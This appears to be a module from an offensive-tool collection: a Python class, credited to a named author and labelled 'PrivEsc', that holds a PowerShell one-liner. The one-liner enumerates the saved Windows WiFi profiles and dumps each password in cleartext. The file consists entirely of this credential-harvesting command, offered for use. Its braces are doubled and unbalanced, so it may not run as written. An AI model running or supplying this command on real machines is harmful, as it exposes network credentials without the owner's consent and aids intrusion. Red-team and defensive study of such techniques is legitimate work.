class info:
    author      = "Vincent Yiu (@vysecurity)"
    description = "One liner to grab all cleartext WiFi passwords"
    function    = "PrivEsc"
    liner     = "(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{{ PROFILE_NAME=$name;PASSWORD=$pass }"
